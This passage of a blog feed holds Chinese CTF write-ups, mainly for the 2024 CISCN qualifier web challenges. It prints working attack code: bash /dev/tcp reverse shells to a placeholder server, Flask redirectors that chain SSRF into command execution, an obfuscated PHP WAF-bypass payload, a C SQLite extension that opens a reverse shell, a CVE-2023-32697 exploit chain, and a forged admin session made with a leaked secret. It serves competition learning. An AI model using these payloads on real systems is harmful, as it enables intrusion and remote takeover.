punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p><code>/flag</code> 路由需要 <code>role=admin</code> 才能访问, 默认的 index 路由仅能获得 <code>role=guest</code> 的 session</p><p>但是源码中泄露了⽤于签名 session 的 secret, 那么我们就能通过这个 secret 伪造⼀个 <code>role=admin</code> 的 session, 进⽽获得 flag</p><p>有两种⽅式：</p><ul><li>使⽤ secure-cookie-faker ⼯具</li><li>⾃建⼀个使⽤相同 secret 的 gin web server</li></ul><p>以第⼀种⽅式为例, 利⽤已知 secret 伪造 session</p><pre class="language-bash" data-language="bash"><code class="language-bash">./secure-cookie-faker enc <span class="token parameter variable">-n</span> <span class="token string">"gosession"</span> <span class="token parameter variable">-k</span> <span class="token string">"Th1s_1s_a_S3cret"</span> <span class="token parameter variable">-o</span> <span class="token string">"&#123;role[string]:admin[string]&#125;"</span></code></pre><p><img src="image-2.png" alt="image-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 CISCN Qual WriteUp</title>
      <link href="/write-up/2024-ciscn-qual-writeup/"/>
      <url>/write-up/2024-ciscn-qual-writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>差一道题就能AK所有Web了，有点可惜</p></blockquote><h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p><code>/flag.php</code> 下存在代码要求访问来源为 <code>127.0.0.1</code> 来实现 RCE ，猜测考点为 <code>ssrf</code></p><p>在 迅睿cms 官网搜索 ssrf 漏洞：<br><img src="image-1.png" alt="image-1.png"></p><p>发现 qrcode 模块存在 ssrf 漏洞，可以伪造服务端请求</p><p>跟进 qrcode api 代码：<br><img src="image-2.png" alt="image-2.png"></p><p>跟进 dr_catcher_data：<br><img src="image-3.png" alt="image-3.png"></p><p>发现确实存在 SSRF 漏洞，故调用 api 触发漏洞：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xxxx</span><span class="token punctuation">></span></span>.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;thumb=http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>%2f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listen_port</span><span class="token punctuation">></span></span>+0%3e%261%22</code></pre><p>发现直接访问好像不行，使用vps来301转发请求：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirectapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f&lt;server_ip>%2f&lt;listen_port>+0%3e%261%22"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">301</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token operator">&lt;</span>redirect_port<span class="token operator">></span><span class="token punctuation">)</span></code></pre><p>修改 api 调用语句：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xxxx</span><span class="token punctuation">></span></span>.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;thumb=http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>redirect_port</span><span class="token punctuation">></span></span></code></pre><p>成功反弹 shell 获得 flag</p><h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>在 <code>easy_cms</code> 的基础上增加了对目标 <code>url</code> 文件类型的检测</p><p>如果目标 url 为图片则调用 <code>dr_catcher_data</code> 读取</p><p><img src="image-4.png" alt="image-4.png"></p><p>因此只需要服务端在调用 <code>getimagesize</code> 第一次访问 url 时返回正常的图片通过检测，在调用 <code>dr_catcher_data</code> 第二次访问 url 时返回 301 重定向即可绕过检测实现 ssrf</p><p>服务端 Python 代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_fileapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>visit_count <span class="token operator">=</span> <span class="token number">0</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> visit_count        <span class="token keyword">if</span> visit_count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        visit_count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'image.png'</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> visit_count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        visit_count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/flag.php?cmd=bash+-c+%22bash+-i+%3e%26+%2fdev%2ftcp%2f&lt;server_ip>%2f&lt;listen_port>+0%3e%261%22"</span><span class="token punctuation">,</span> code<span class="token operator">=</span><span class="token number">301</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"You have already visited twice."</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8989</span><span class="token punctuation">)</span></code></pre><h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><p>反弹shell命令：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i >&amp; /dev/tcp/&lt;server_ip>/&lt;listen_port> 0>&amp;1"</span></code></pre><p>php system() 命令执行 绕过waf：</p><pre class="language-php" data-language="php"><code class="language-php">php <span class="token operator">-</span><span class="token class-name type-declaration">r</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$h</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$h</span><span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>拿到 shell 后不难发现容器中存在 mysql 且根目录下没有 flag</p><p>故猜测 flag 在 mysql 数据库里，使用如下命令获取 tty ：</p><pre class="language-bash" data-language="bash"><code class="language-bash">script /dev/null <span class="token parameter variable">-c</span> /bin/bash</code></pre><p>然后连接 mysql 即可获得数据库中的 flag ：</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span></code></pre><p>账号密码均为 root</p><h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><code>pom.xml</code> 中给出了 <code>sqlite</code> 的依赖如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.xerial<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>sqlite-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.8.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>查找 <code>mvnrepository</code> 发现 <code>sqlite-jdbc:3.8.9</code> 存在 <code>CVE-2023-32697</code> 漏洞<br><img src="image-5.png" alt="image-5.png"><br>该漏洞的利用需要满足 jdbcUrl 和 sql 语句同时可控，并且需要开启 <code>LoadExtension</code></p><p>而 <code>com.example.jdbctest.utils.sql.SqliteDatasourceConnector</code> 中开启了 <code>LoadExtension</code><br><img src="image-6.png" alt="image-6.png"><br><code>getTableContent</code> 中由于 <code>tableName</code> 可控，可以实现 sql 注入<br><img src="image-7.png" alt="image-7.png"><br>而 <code>jdbcUrl</code> 由前端传入，也是可控的<br><img src="image-8.png" alt="image-8.png"><br>因此符合漏洞利用条件</p><p>首先先在本地创建一个 <code>sqlite.db</code> 用于后续 sql 注入</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'sqlite.db'</span><span class="token punctuation">)</span>cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''    CREATE TABLE IF NOT EXISTS user (        username TEXT NOT NULL,        password TEXT NOT NULL    )'''</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Database and user table created successfully."</span><span class="token punctuation">)</span></code></pre><p>然后构造恶意 extension <code>ext.so</code>：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// ext.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sqlite3ext.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dirent.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>SQLITE_EXTENSION_INIT1<span class="token keyword">int</span> tcp_port <span class="token operator">=</span> <span class="token operator">&lt;</span>listen_port<span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>ip <span class="token operator">=</span> <span class="token string">"&lt;server_ip>"</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_WIN32</span></span><span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">int</span> <span class="token function">sqlite3_extension_init</span><span class="token punctuation">(</span>  sqlite3 <span class="token operator">*</span>db<span class="token punctuation">,</span>   <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>pzErrMsg<span class="token punctuation">,</span>   <span class="token keyword">const</span> sqlite3_api_routines <span class="token operator">*</span>pApi<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> rc <span class="token operator">=</span> SQLITE_OK<span class="token punctuation">;</span>  <span class="token function">SQLITE_EXTENSION_INIT2</span><span class="token punctuation">(</span>pApi<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> addr<span class="token punctuation">;</span>    addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>tcp_port<span class="token punctuation">)</span><span class="token punctuation">;</span>    addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">connect</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> rc<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>安装 <code>sqlite-dev</code> 包并编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libsqlite3-devgcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> ext.c <span class="token parameter variable">-o</span> ext.so</code></pre><p>在 vps 上使用 python 开启文件服务</p><pre class="language-none"><code class="language-none">python3 -m http.server &lt;file_port&gt;</code></pre><p>然后构造 jdbcURL 来将 sqlite.db 和 ext.so 放入靶机缓存文件</p><pre class="language-none"><code class="language-none">jdbc:sqlite::resource:http:&#x2F;&#x2F;&lt;server_ip&gt;:&lt;file_port&gt;&#x2F;sqlite.dbjdbc:sqlite::resource:http:&#x2F;&#x2F;&lt;server_ip&gt;:&lt;file_port&gt;&#x2F;ext.so</code></pre><p>利用 <code>hashcode()</code> 漏洞计算 <code>/tmp</code> 下的文件名</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span>   <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">String</span> url1 <span class="token operator">=</span> <span class="token string">"http://&lt;server_ip>:&lt;file_port>/sqlite.db"</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> url2 <span class="token operator">=</span> <span class="token string">"http://&lt;server_ip>:&lt;file_port>/ext.so"</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> tmp <span class="token operator">=</span> <span class="token string">"/tmp/sqlite-jdbc-tmp-"</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> db <span class="token operator">=</span> tmp <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".db"</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> so <span class="token operator">=</span> tmp <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".so"</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>db<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>so<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>最后利用 sql 注入完成 Sqlite extension 加载实现 RCE</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"3"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp--&lt;calc_db>.db?enable_load_extension=true"</span><span class="token punctuation">,</span>    <span class="token property">"tableName"</span><span class="token operator">:</span><span class="token string">"user UNION SELECT 1,load_extension('/tmp/sqlite-jdbc-tmp--&lt;calc_so>.db');"</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 高校网络安全管理运维赛 WriteUp</title>
      <link href="/write-up/2024-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-writeup/"/>
      <url>/write-up/2024-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-writeup/</url>
      
